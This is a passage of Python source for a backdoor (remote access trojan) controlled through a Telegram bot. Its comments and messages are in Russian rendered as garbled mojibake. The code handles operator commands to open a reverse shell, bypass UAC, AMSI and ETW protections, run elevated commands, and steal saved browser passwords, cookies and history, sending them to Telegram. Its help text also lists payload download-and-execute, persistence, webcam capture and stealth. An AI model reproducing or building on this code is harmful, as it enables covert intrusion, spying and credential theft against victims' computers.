                                    send_text_to_telegram("<b>‚ùå –ù–µ–≤–µ—Ä–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç.</b> –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ —Ñ–æ—Ä–º–∞—Ç: <code>/reverse_shell_start [ID] host:port</code>")
                            else:
                                send_text_to_telegram("<b>‚ùå –ü–∞—Ä–∞–º–µ—Ç—Ä—ã –Ω–µ —É–∫–∞–∑–∞–Ω—ã.</b> –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ —Ñ–æ—Ä–º–∞—Ç: <code>/reverse_shell_start [ID] host:port</code>")

                        # –û–±—Ä–∞–±–æ—Ç–∫–∞ –∫–æ–º–∞–Ω–¥—ã /reverse_shell_stop
                        elif command.startswith("/reverse_shell_stop"):
                            logging.info("–û–±—Ä–∞–±–æ—Ç–∫–∞ –∫–æ–º–∞–Ω–¥—ã /reverse_shell_stop")
                            stop_global_shell()
                            send_text_to_telegram("<b>üõë Reverse Shell –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω</b>")

                        # –û–±—Ä–∞–±–æ—Ç–∫–∞ –∫–æ–º–∞–Ω–¥—ã /reverse_shell_status
                        elif command.startswith("/reverse_shell_status"):
                            logging.info("–û–±—Ä–∞–±–æ—Ç–∫–∞ –∫–æ–º–∞–Ω–¥—ã /reverse_shell_status")
                            shell = get_global_shell()
                            if shell:
                                status = shell.get_status()
                                message = f"<b>üîó –°–¢–ê–¢–£–° REVERSE SHELL</b>\n\n"
                                message += f"<b>–ó–∞–ø—É—â–µ–Ω:</b> {'‚úÖ –î–∞' if status['is_running'] else '‚ùå –ù–µ—Ç'}\n"
                                message += f"<b>–ü–æ–¥–∫–ª—é—á–µ–Ω:</b> {'‚úÖ –î–∞' if status['is_connected'] else '‚ùå –ù–µ—Ç'}\n"
                                message += f"<b>–•–æ—Å—Ç:</b> {status['host']}\n"
                                message += f"<b>–ü–æ—Ä—Ç:</b> {status['port']}\n"
                                message += f"<b>–ü–æ–ø—ã—Ç–∫–∏ –ø–µ—Ä–µ–ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è:</b> {status['reconnect_attempts']}\n"
                                send_text_to_telegram(message)
                            else:
                                send_text_to_telegram("<b>‚ùå Reverse Shell –Ω–µ –∑–∞–ø—É—â–µ–Ω</b>")

                        # –û–±—Ä–∞–±–æ—Ç–∫–∞ –∫–æ–º–∞–Ω–¥—ã /windows_bypass
                        elif command.startswith("/windows_bypass"):
                            logging.info("–û–±—Ä–∞–±–æ—Ç–∫–∞ –∫–æ–º–∞–Ω–¥—ã /windows_bypass")
                            send_text_to_telegram("<b>üõ°Ô∏è –ü—Ä–∏–º–µ–Ω–µ–Ω–∏–µ Windows Bypass...</b>")
                            
                            bypass_results = apply_windows_bypasses()
                            
                            message = f"<b>üõ°Ô∏è –†–ï–ó–£–õ–¨–¢–ê–¢–´ WINDOWS BYPASS</b>\n\n"
                            
                            # UAC bypass
                            if bypass_results.get("uac"):
                                uac = bypass_results["uac"]
                                if uac["success"]:
                                    message += f"‚úÖ <b>UAC Bypass:</b> {uac['method']}\n"
                                else:
                                    message += f"‚ùå <b>UAC Bypass:</b> {uac.get('error', '–ù–µ —É–¥–∞–ª–æ—Å—å')}\n"
                            else:
                                message += "‚ö†Ô∏è <b>UAC Bypass:</b> –ù–µ —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–ª—Å—è\n"
                            
                            # AMSI bypass
                            amsi = bypass_results.get("amsi", {})
                            if amsi.get("success"):
                                message += f"‚úÖ <b>AMSI Bypass:</b> {amsi['method']}\n"
                            else:
                                message += f"‚ùå <b>AMSI Bypass:</b> {amsi.get('error', '–ù–µ —É–¥–∞–ª–æ—Å—å')}\n"
                            
                            # ETW bypass
                            etw = bypass_results.get("etw", {})
                            if etw.get("success"):
                                message += f"‚úÖ <b>ETW Bypass:</b> {etw['method']}\n"
                            else:
                                message += f"‚ùå <b>ETW Bypass:</b> {etw.get('error', '–ù–µ —É–¥–∞–ª–æ—Å—å')}\n"
                            
                            # –û–±—â–∏–π —Ä–µ–∑—É–ª—å—Ç–∞—Ç
                            if bypass_results.get("overall_success"):
                                message += "\nüéâ <b>–û–±—â–∏–π —Ä–µ–∑—É–ª—å—Ç–∞—Ç:</b> –í—Å–µ bypass –ø—Ä–∏–º–µ–Ω–µ–Ω—ã —É—Å–ø–µ—à–Ω–æ!"
                            else:
                                message += "\n‚ö†Ô∏è <b>–û–±—â–∏–π —Ä–µ–∑—É–ª—å—Ç–∞—Ç:</b> –ß–∞—Å—Ç–∏—á–Ω—ã–π —É—Å–ø–µ—Ö"
                            
                            send_text_to_telegram(message)

                        # –û–±—Ä–∞–±–æ—Ç–∫–∞ –∫–æ–º–∞–Ω–¥—ã /elevated_cmd
                        elif command.startswith("/elevated_cmd"):
                            logging.info("–û–±—Ä–∞–±–æ—Ç–∫–∞ –∫–æ–º–∞–Ω–¥—ã /elevated_cmd")
                            clean_cmd = clean_command(command)
                            if clean_cmd:
                                cmd_text = clean_cmd.strip()
                                send_text_to_telegram(f"<b>üîê –í—ã–ø–æ–ª–Ω—è—é –∫–æ–º–∞–Ω–¥—É —Å –ø–æ–≤—ã—à–µ–Ω–Ω—ã–º–∏ –ø—Ä–∏–≤–∏–ª–µ–≥–∏—è–º–∏:</b>\n<code>{cmd_text}</code>")
                                
                                result = bypass_uac_command(cmd_text)
                                if result["success"]:
                                    output = result.get("output", "–ö–æ–º–∞–Ω–¥–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∞ —É—Å–ø–µ—à–Ω–æ")
                                    method = result.get("bypass_method", "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ")
                                    send_text_to_telegram(f"<b>‚úÖ –ö–æ–º–∞–Ω–¥–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∞ —á–µ—Ä–µ–∑ {method}:</b>\n<code>{output}</code>")
                                else:
                                    error = result.get("error", "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è –æ—à–∏–±–∫–∞")
                                    send_text_to_telegram(f"<b>‚ùå –û—à–∏–±–∫–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è:</b>\n<code>{error}</code>")
                            else:
                                send_text_to_telegram("<b>‚ùå –ö–æ–º–∞–Ω–¥–∞ –Ω–µ —É–∫–∞–∑–∞–Ω–∞.</b> –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ —Ñ–æ—Ä–º–∞—Ç: <code>/elevated_cmd [ID] –∫–æ–º–∞–Ω–¥–∞</code>")

                        # –û–±—Ä–∞–±–æ—Ç–∫–∞ –∫–æ–º–∞–Ω–¥—ã /browser_data
                        elif command.startswith("/browser_data"):
                            logging.info("–û–±—Ä–∞–±–æ—Ç–∫–∞ –∫–æ–º–∞–Ω–¥—ã /browser_data")
                            try:
                                # –ò–∑–≤–ª–µ–∫–∞–µ–º –ø–∞—Ä–∞–º–µ—Ç—Ä—ã
                                parts = command.split(" ", 2)
                                if len(parts) >= 2:
                                    device_id = parts[1]
                                    browser_name = parts[2] if len(parts) > 2 else None
                                    
                                    # –ò–∑–≤–ª–µ–∫–∞–µ–º –≤—Å–µ –¥–∞–Ω–Ω—ã–µ –±—Ä–∞—É–∑–µ—Ä–æ–≤
                                    result = extract_all_browser_data(browser_name)
                                    
                                    if result["success"]:
                                        message = f"<b>üåê –î–ê–ù–ù–´–ï –ë–†–ê–£–ó–ï–†–û–í</b>\n\n"
                                        message += f"<b>–í—Å–µ–≥–æ –ø–∞—Ä–æ–ª–µ–π:</b> {result['total_passwords']}\n"
                                        message += f"<b>–í—Å–µ–≥–æ –∫—É–∫–∏:</b> {result['total_cookies']}\n"
                                        message += f"<b>–í—Å–µ–≥–æ –∑–∞–ø–∏—Å–µ–π –∏—Å—Ç–æ—Ä–∏–∏:</b> {result['total_history']}\n\n"
                                        
                                        for browser, data in result["browsers"].items():
                                            if "error" not in data:
                                                message += f"<b>{browser.upper()}:</b>\n"
                                                message += f"  –ü–∞—Ä–æ–ª–∏: {len(data.get('passwords', []))}\n"
                                                message += f"  –ö—É–∫–∏: {len(data.get('cookies', []))}\n"
                                                message += f"  –ò—Å—Ç–æ—Ä–∏—è: {len(data.get('history', []))}\n\n"
                                            else:
                                                message += f"<b>{browser.upper()}:</b> ‚ùå {data['error']}\n\n"
                                    else:
                                        message = f"<b>‚ùå –û–®–ò–ë–ö–ê –ò–ó–í–õ–ï–ß–ï–ù–ò–Ø –î–ê–ù–ù–´–•</b>\n\n{result['error']}"
                                else:
                                    message = "<b>‚ùå –ù–ï–ü–†–ê–í–ò–õ–¨–ù–´–ô –§–û–†–ú–ê–¢ –ö–û–ú–ê–ù–î–´</b>\n\n"
                                    message += "<code>/browser_data [ID] [–±—Ä–∞—É–∑–µ—Ä]</code>\n"
                                    message += "<i>–ë—Ä–∞—É–∑–µ—Ä: chrome, firefox, edge, safari (–Ω–µ–æ–±—è–∑–∞—Ç–µ–ª—å–Ω–æ)</i>"
                                    
                            except Exception as e:
                                message = f"<b>‚ùå –û–®–ò–ë–ö–ê –û–ë–†–ê–ë–û–¢–ö–ò –ö–û–ú–ê–ù–î–´</b>\n\n{str(e)}"
                                logging.error(f"–û—à–∏–±–∫–∞ –æ–±—Ä–∞–±–æ—Ç–∫–∏ –∫–æ–º–∞–Ω–¥—ã /browser_data: {e}")
                            
                            # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Ä–µ–∑—É–ª—å—Ç–∞—Ç
                            send_text_to_telegram(message)

                        # –û–±—Ä–∞–±–æ—Ç–∫–∞ –∫–æ–º–∞–Ω–¥—ã /browser_passwords
                        elif command.startswith("/browser_passwords"):
                            logging.info("–û–±—Ä–∞–±–æ—Ç–∫–∞ –∫–æ–º–∞–Ω–¥—ã /browser_passwords")
                            try:
                                # –ò–∑–≤–ª–µ–∫–∞–µ–º –ø–∞—Ä–∞–º–µ—Ç—Ä—ã
                                parts = command.split(" ", 2)
                                if len(parts) >= 2:
                                    device_id = parts[1]
                                    browser_name = parts[2] if len(parts) > 2 else None
                                    
                                    # –ò–∑–≤–ª–µ–∫–∞–µ–º –ø–∞—Ä–æ–ª–∏
                                    result = extract_browser_passwords(browser_name)
                                    
                                    if result["success"]:
                                        message = f"<b>üîê –ü–ê–†–û–õ–ò –ë–†–ê–£–ó–ï–†–û–í</b>\n\n"
                                        message += f"<b>–ù–∞–π–¥–µ–Ω–æ –ø–∞—Ä–æ–ª–µ–π:</b> {len(result['passwords'])}\n\n"
                                        
                                        # –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –ø–µ—Ä–≤—ã–µ 10 –ø–∞—Ä–æ–ª–µ–π
                                        for i, pwd in enumerate(result["passwords"][:10]):
                                            message += f"<b>{i+1}.</b> {pwd['url']}\n"
                                            message += f"   –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: {pwd['username']}\n"
                                            message += f"   –ü–∞—Ä–æ–ª—å: {pwd['password']}\n"
                                            if pwd.get('browser'):
                                                message += f"   –ë—Ä–∞—É–∑–µ—Ä: {pwd['browser']}\n"
                                            message += "\n"
                                        
                                        if len(result["passwords"]) > 10:
                                            message += f"<i>... –∏ –µ—â–µ {len(result['passwords']) - 10} –ø–∞—Ä–æ–ª–µ–π</i>"
                                    else:
                                        message = f"<b>‚ùå –û–®–ò–ë–ö–ê –ò–ó–í–õ–ï–ß–ï–ù–ò–Ø –ü–ê–†–û–õ–ï–ô</b>\n\n{result['error']}"
                                else:
                                    message = "<b>‚ùå –ù–ï–ü–†–ê–í–ò–õ–¨–ù–´–ô –§–û–†–ú–ê–¢ –ö–û–ú–ê–ù–î–´</b>\n\n"
                                    message += "<code>/browser_passwords [ID] [–±—Ä–∞—É–∑–µ—Ä]</code>\n"
                                    message += "<i>–ë—Ä–∞—É–∑–µ—Ä: chrome, firefox, edge, safari (–Ω–µ–æ–±—è–∑–∞—Ç–µ–ª—å–Ω–æ)</i>"
                                    
                            except Exception as e:
                                message = f"<b>‚ùå –û–®–ò–ë–ö–ê –û–ë–†–ê–ë–û–¢–ö–ò –ö–û–ú–ê–ù–î–´</b>\n\n{str(e)}"
                                logging.error(f"–û—à–∏–±–∫–∞ –æ–±—Ä–∞–±–æ—Ç–∫–∏ –∫–æ–º–∞–Ω–¥—ã /browser_passwords: {e}")
                            
                            # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Ä–µ–∑—É–ª—å—Ç–∞—Ç
                            send_text_to_telegram(message)

                        # –û–±—Ä–∞–±–æ—Ç–∫–∞ –∫–æ–º–∞–Ω–¥—ã /browser_cookies
                        elif command.startswith("/browser_cookies"):
                            logging.info("–û–±—Ä–∞–±–æ—Ç–∫–∞ –∫–æ–º–∞–Ω–¥—ã /browser_cookies")
                            try:
                                # –ò–∑–≤–ª–µ–∫–∞–µ–º –ø–∞—Ä–∞–º–µ—Ç—Ä—ã
                                parts = command.split(" ", 2)
                                if len(parts) >= 2:
                                    device_id = parts[1]
                                    browser_name = parts[2] if len(parts) > 2 else None
                                    
                                    # –ò–∑–≤–ª–µ–∫–∞–µ–º –∫—É–∫–∏
                                    result = extract_browser_cookies(browser_name)
                                    
                                    if result["success"]:
                                        message = f"<b>üç™ –ö–£–ö–ò –ë–†–ê–£–ó–ï–†–û–í</b>\n\n"
                                        message += f"<b>–ù–∞–π–¥–µ–Ω–æ –∫—É–∫–∏:</b> {len(result['cookies'])}\n\n"
                                        
                                        # –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –ø–µ—Ä–≤—ã–µ 10 –∫—É–∫–∏
                                        for i, cookie in enumerate(result["cookies"][:10]):
                                            message += f"<b>{i+1}.</b> {cookie['domain']}\n"
                                            message += f"   –ò–º—è: {cookie['name']}\n"
                                            message += f"   –ó–Ω–∞—á–µ–Ω–∏–µ: {cookie['value'][:50]}...\n"
                                            if cookie.get('browser'):
                                                message += f"   –ë—Ä–∞—É–∑–µ—Ä: {cookie['browser']}\n"
                                            message += "\n"
                                        
                                        if len(result["cookies"]) > 10:
                                            message += f"<i>... –∏ –µ—â–µ {len(result['cookies']) - 10} –∫—É–∫–∏</i>"
                                    else:
                                        message = f"<b>‚ùå –û–®–ò–ë–ö–ê –ò–ó–í–õ–ï–ß–ï–ù–ò–Ø –ö–£–ö–ò</b>\n\n{result['error']}"
                                else:
                                    message = "<b>‚ùå –ù–ï–ü–†–ê–í–ò–õ–¨–ù–´–ô –§–û–†–ú–ê–¢ –ö–û–ú–ê–ù–î–´</b>\n\n"
                                    message += "<code>/browser_cookies [ID] [–±—Ä–∞—É–∑–µ—Ä]</code>\n"
                                    message += "<i>–ë—Ä–∞—É–∑–µ—Ä: chrome, firefox, edge, safari (–Ω–µ–æ–±—è–∑–∞—Ç–µ–ª—å–Ω–æ)</i>"
                                    
                            except Exception as e:
                                message = f"<b>‚ùå –û–®–ò–ë–ö–ê –û–ë–†–ê–ë–û–¢–ö–ò –ö–û–ú–ê–ù–î–´</b>\n\n{str(e)}"
                                logging.error(f"–û—à–∏–±–∫–∞ –æ–±—Ä–∞–±–æ—Ç–∫–∏ –∫–æ–º–∞–Ω–¥—ã /browser_cookies: {e}")
                            
                            # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Ä–µ–∑—É–ª—å—Ç–∞—Ç
                            send_text_to_telegram(message)

                        # –û–±—Ä–∞–±–æ—Ç–∫–∞ –∫–æ–º–∞–Ω–¥—ã /browser_history
                        elif command.startswith("/browser_history"):
                            logging.info("–û–±—Ä–∞–±–æ—Ç–∫–∞ –∫–æ–º–∞–Ω–¥—ã /browser_history")
                            try:
                                # –ò–∑–≤–ª–µ–∫–∞–µ–º –ø–∞—Ä–∞–º–µ—Ç—Ä—ã
                                parts = command.split(" ", 2)
                                if len(parts) >= 2:
                                    device_id = parts[1]
                                    browser_name = parts[2] if len(parts) > 2 else None
                                    
                                    # –ò–∑–≤–ª–µ–∫–∞–µ–º –∏—Å—Ç–æ—Ä–∏—é
                                    result = extract_browser_history(browser_name)
                                    
                                    if result["success"]:
                                        message = f"<b>üìö –ò–°–¢–û–†–ò–Ø –ë–†–ê–£–ó–ï–†–û–í</b>\n\n"
                                        message += f"<b>–ù–∞–π–¥–µ–Ω–æ –∑–∞–ø–∏—Å–µ–π:</b> {len(result['history'])}\n\n"
                                        
                                        # –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –ø–µ—Ä–≤—ã–µ 10 –∑–∞–ø–∏—Å–µ–π
                                        for i, entry in enumerate(result["history"][:10]):
                                            message += f"<b>{i+1}.</b> {entry['url']}\n"
                                            if entry.get('title'):
                                                message += f"   –ó–∞–≥–æ–ª–æ–≤–æ–∫: {entry['title']}\n"
                                            if entry.get('browser'):
                                                message += f"   –ë—Ä–∞—É–∑–µ—Ä: {entry['browser']}\n"
                                            message += "\n"
                                        
                                        if len(result["history"]) > 10:
                                            message += f"<i>... –∏ –µ—â–µ {len(result['history']) - 10} –∑–∞–ø–∏—Å–µ–π</i>"
                                    else:
                                        message = f"<b>‚ùå –û–®–ò–ë–ö–ê –ò–ó–í–õ–ï–ß–ï–ù–ò–Ø –ò–°–¢–û–†–ò–ò</b>\n\n{result['error']}"
                                else:
                                    message = "<b>‚ùå –ù–ï–ü–†–ê–í–ò–õ–¨–ù–´–ô –§–û–†–ú–ê–¢ –ö–û–ú–ê–ù–î–´</b>\n\n"
                                    message += "<code>/browser_history [ID] [–±—Ä–∞—É–∑–µ—Ä]</code>\n"
                                    message += "<i>–ë—Ä–∞—É–∑–µ—Ä: chrome, firefox, edge, safari (–Ω–µ–æ–±—è–∑–∞—Ç–µ–ª—å–Ω–æ)</i>"
                                    
                            except Exception as e:
                                message = f"<b>‚ùå –û–®–ò–ë–ö–ê –û–ë–†–ê–ë–û–¢–ö–ò –ö–û–ú–ê–ù–î–´</b>\n\n{str(e)}"
                                logging.error(f"–û—à–∏–±–∫–∞ –æ–±—Ä–∞–±–æ—Ç–∫–∏ –∫–æ–º–∞–Ω–¥—ã /browser_history: {e}")
                            
                            # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Ä–µ–∑—É–ª—å—Ç–∞—Ç
                            send_text_to_telegram(message)

                        # –û–±—Ä–∞–±–æ—Ç–∫–∞ –∫–æ–º–∞–Ω–¥—ã /help
                        elif command.startswith("/help"):
                            logging.info("–û–±—Ä–∞–±–æ—Ç–∫–∞ –∫–æ–º–∞–Ω–¥—ã /help")
                            help_message = """üìö <b>–°–ü–†–ê–í–ö–ê –ü–û –ö–û–ú–ê–ù–î–ê–ú:</b>

<code>/info [ID]</code> - –ü–æ–ª—É—á–∏—Ç—å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ —Å–∏—Å—Ç–µ–º–µ.
<code>/list</code> - –ü–æ–ª—É—á–∏—Ç—å —Å–ø–∏—Å–æ–∫ –≤—Å–µ—Ö –∞–∫—Ç–∏–≤–Ω—ã—Ö —É—Å—Ç—Ä–æ–π—Å—Ç–≤.
<code>/download [ID] [URL]</code> - –ó–∞–≥—Ä—É–∑–∏—Ç—å –∏ –∑–∞–ø—É—Å—Ç–∏—Ç—å EXE —Ñ–∞–π–ª.
<code>/update [ID] [URL]</code> - –û–±–Ω–æ–≤–∏—Ç—å —Å–∫—Ä–∏–ø—Ç –¥–æ –Ω–æ–≤–æ–π –≤–µ—Ä—Å–∏–∏.
<code>/persist [ID]</code> - –£—Å–∏–ª–∏—Ç—å –ø–µ—Ä—Å–∏—Å—Ç–µ–Ω—Ç–Ω–æ—Å—Ç—å (–∞–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫–∞, —Å–∫—Ä—ã—Ç—ã–µ –∫–æ–ø–∏–∏, —Å–ª—É–∂–±–∞).
<code>/restart [ID]</code> - –ü–µ—Ä–µ–∑–∞–ø—É—Å—Ç–∏—Ç—å —Å–∫—Ä–∏–ø—Ç.
<code>/kill [ID]</code> - –£–¥–∞–ª–∏—Ç—å –±—ç–∫–¥–æ—Ä –∏ –≤—Å–µ –µ–≥–æ —Å–ª–µ–¥—ã.

<b>üÜï –ù–û–í–´–ï –ö–û–ú–ê–ù–î–´:</b>
<code>/screenshot [ID]</code> - –°–¥–µ–ª–∞—Ç—å —Å–∫—Ä–∏–Ω—à–æ—Ç —ç–∫—Ä–∞–Ω–∞.
<code>/webcam [ID]</code> - –°–¥–µ–ª–∞—Ç—å —Ñ–æ—Ç–æ —Å –≤–µ–±-–∫–∞–º–µ—Ä—ã.
<code>/processes [ID]</code> - –ü–æ–ª—É—á–∏—Ç—å —Å–ø–∏—Å–æ–∫ –ø—Ä–æ—Ü–µ—Å—Å–æ–≤.
<code>/kill_process [ID] [PID]</code> - –ó–∞–≤–µ—Ä—à–∏—Ç—å –ø—Ä–æ—Ü–µ—Å—Å –ø–æ PID.
<code>/browse [ID] [–ø—É—Ç—å]</code> - –ü—Ä–æ—Å–º–æ—Ç—Ä–µ—Ç—å —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ –ø–∞–ø–∫–∏.
<code>/download_file [ID] [–ø—É—Ç—å]</code> - –ó–∞–≥—Ä—É–∑–∏—Ç—å —Ñ–∞–π–ª —Å —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞.
<code>/stealth [ID]</code> - –ü—Ä–∏–º–µ–Ω–∏—Ç—å –º–µ—Ä—ã —Å–∫—Ä—ã—Ç–Ω–æ—Å—Ç–∏.

<b>üíª –ö–û–ú–ê–ù–î–ù–ê–Ø –°–¢–†–û–ö–ê:</b>
<code>/cmd [ID] [–∫–æ–º–∞–Ω–¥–∞]</code> - –í—ã–ø–æ–ª–Ω–∏—Ç—å –∫–æ–º–∞–Ω–¥—É –æ—Ç –∏–º–µ–Ω–∏ –æ–±—ã—á–Ω–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è.
<code>/admin_cmd [ID] [–∫–æ–º–∞–Ω–¥–∞]</code> - –í—ã–ø–æ–ª–Ω–∏—Ç—å –∫–æ–º–∞–Ω–¥—É –æ—Ç –∏–º–µ–Ω–∏ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞.

<b>üîó REVERSE SHELL:</b>
<code>/reverse_shell_start [ID] host:port</code> - –ó–∞–ø—É—Å—Ç–∏—Ç—å reverse shell.
<code>/reverse_shell_stop [ID]</code> - –û—Å—Ç–∞–Ω–æ–≤–∏—Ç—å reverse shell.
<code>/reverse_shell_status [ID]</code> - –°—Ç–∞—Ç—É—Å reverse shell.

<b>üõ°Ô∏è WINDOWS BYPASS:</b>
<code>/windows_bypass [ID]</code> - –ü—Ä–∏–º–µ–Ω–∏—Ç—å –≤—Å–µ –º–µ—Ç–æ–¥—ã bypass (UAC/AMSI/ETW).
<code>/elevated_cmd [ID] [–∫–æ–º–∞–Ω–¥–∞]</code> - –í—ã–ø–æ–ª–Ω–∏—Ç—å –∫–æ–º–∞–Ω–¥—É —Å –ø–æ–≤—ã—à–µ–Ω–Ω—ã–º–∏ –ø—Ä–∏–≤–∏–ª–µ–≥–∏—è–º–∏.

<b>üåê –ë–†–ê–£–ó–ï–†-–î–ê–ù–ù–´–ï:</b>
<code>/browser_data [ID] [–±—Ä–∞—É–∑–µ—Ä]</code> - –ò–∑–≤–ª–µ—á—å –≤—Å–µ –¥–∞–Ω–Ω—ã–µ –±—Ä–∞—É–∑–µ—Ä–æ–≤.
<code>/browser_passwords [ID] [–±—Ä–∞—É–∑–µ—Ä]</code> - –ò–∑–≤–ª–µ—á—å –ø–∞—Ä–æ–ª–∏ –±—Ä–∞—É–∑–µ—Ä–æ–≤.
<code>/browser_cookies [ID] [–±—Ä–∞—É–∑–µ—Ä]</code> - –ò–∑–≤–ª–µ—á—å –∫—É–∫–∏ –±—Ä–∞—É–∑–µ—Ä–æ–≤.
<code>/browser_history [ID] [–±—Ä–∞—É–∑–µ—Ä]</code> - –ò–∑–≤–ª–µ—á—å –∏—Å—Ç–æ—Ä–∏—é –±—Ä–∞—É–∑–µ—Ä–æ–≤.

<code>/help</code> - –ü–æ–∫–∞–∑–∞—Ç—å —ç—Ç–æ —Å–æ–æ–±—â–µ–Ω–∏–µ.

<b>[ID]</b> - –ù–µ–æ–±—è–∑–∞—Ç–µ–ª—å–Ω—ã–π –ø–∞—Ä–∞–º–µ—Ç—Ä. –ï—Å–ª–∏ —É–∫–∞–∑–∞–Ω, –∫–æ–º–∞–Ω–¥–∞ –±—É–¥–µ—Ç –≤—ã–ø–æ–ª–Ω–µ–Ω–∞ —Ç–æ–ª—å–∫–æ –Ω–∞ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–µ —Å —ç—Ç–∏–º ID. –ï—Å–ª–∏ –Ω–µ —É–∫–∞–∑–∞–Ω, –∫–æ–º–∞–Ω–¥–∞ –≤—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è –Ω–∞ –≤—Å–µ—Ö —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞—Ö.
"""
                            send_text_to_telegram(help_message)
                        
                        else:
                            logging.info(f"–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è –∫–æ–º–∞–Ω–¥–∞: {command}")
                            send_text_to_telegram(f"<b>‚ùå –ù–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è –∫–æ–º–∞–Ω–¥–∞:</b> <code>{command}</code>\nüí° <b>–°–ø—Ä–∞–≤–∫–∞:</b> /help")
                            
                    last_update_id = update["update_id"]
                except Exception as e:
                    logging.error(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ–±—Ä–∞–±–æ—Ç–∫–µ –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è: {e}")
            
            time.sleep(1) # –ö–æ—Ä–æ—Ç–∫–∞—è –∑–∞–¥–µ—Ä–∂–∫–∞, —á—Ç–æ–±—ã –Ω–µ —Å–ø–∞–º–∏—Ç—å –∑–∞–ø—Ä–æ—Å–∞–º–∏
            
        except requests.exceptions.RequestException as e:
            logging.error(f"–û—à–∏–±–∫–∞ —Å–µ—Ç–∏ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ –æ–±–Ω–æ–≤–ª–µ–Ω–∏–π: {e}")
            time.sleep(reconnect_delay)
            reconnect_delay = min(reconnect_delay * 1.5, max_reconnect_delay)
        except Exception as e:
            logging.error(f"–ù–µ–ø—Ä–µ–¥–≤–∏–¥–µ–Ω–Ω–∞—è –æ—à–∏–±–∫–∞ –≤ –æ—Å–Ω–æ–≤–Ω–æ–º —Ü–∏–∫–ª–µ: {e}")
            time.sleep(reconnect_delay)
            reconnect_delay = min(reconnect_delay * 1.5, max_reconnect_delay)

def main():
    try:
        # –ü—Ä–æ–≤–µ—Ä—è–µ–º, –Ω–µ –∑–∞–ø—É—â–µ–Ω –ª–∏ —Å–∫—Ä–∏–ø—Ç –¥–ª—è –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è –∞–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫–∏
        if len(sys.argv) > 1 and sys.argv[1] == "--update-autostart":
            logging.info("–ó–∞–ø—É—Å–∫ –¥–ª—è –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è –∞–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫–∏")
            try:
                current_script = os.path.abspath(sys.argv[0])
                results = update_autostart_paths(current_script)
                
                # –õ–æ–≥–∏—Ä—É–µ–º —Ä–µ–∑—É–ª—å—Ç–∞—Ç—ã
                success_count = sum(1 for result in results.values() if result)
                logging.info(f"–û–±–Ω–æ–≤–ª–µ–Ω–∏–µ –∞–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫–∏ –∑–∞–≤–µ—Ä—à–µ–Ω–æ: {success_count}/{len(results)} –º–µ—Ç–æ–¥–æ–≤ —É—Å–ø–µ—à–Ω–æ")
                
                # –ó–∞–≤–µ—Ä—à–∞–µ–º –ø—Ä–æ—Ü–µ—Å—Å
                os._exit(0)
                
            except Exception as e:
                logging.error(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ–±–Ω–æ–≤–ª–µ–Ω–∏–∏ –∞–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫–∏: {e}")
                os._exit(1)
        
        logging.info("–ó–∞–ø—É—Å–∫ –±—ç–∫–¥–æ—Ä–∞")
        
        # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ –∑–∞–ø—É—Å–∫–µ
        instance_id = get_or_create_instance_id()
        instance_name = get_or_create_instance_name()
        
        # –ü–æ–ª—É—á–∞–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ —Å–∏—Å—Ç–µ–º–µ –∏ –¥–æ–±–∞–≤–ª—è–µ–º —É—Å—Ç—Ä–æ–π—Å—Ç–≤–æ –≤ —Å–ø–∏—Å–æ–∫
        system_info = get_system_info()
        add_device_to_list(instance_id, instance_name, system_info)
        
        startup_message = f"""üöÄ <b>–ë–≠–ö–î–û–† –ó–ê–ü–£–©–ï–ù</b>

üÜî <b>–≠–∫–∑–µ–º–ø–ª—è—Ä:</b> <code>{instance_id}</code>
üìù <b>–ò–º—è:</b> <code>{instance_name}</code>
üïê <b>–í—Ä–µ–º—è:</b> {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
üíª <b>–°–∏—Å—Ç–µ–º–∞:</b> {platform.system()} {platform.release()}
üë§ <b>–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å:</b> {system_info.get("username", "N/A")}

‚úÖ <b>–°—Ç–∞—Ç—É—Å:</b> –ì–æ—Ç–æ–≤ –∫ —Ä–∞–±–æ—Ç–µ
üí° <b>–°–ø—Ä–∞–≤–∫–∞:</b> /help"""
        
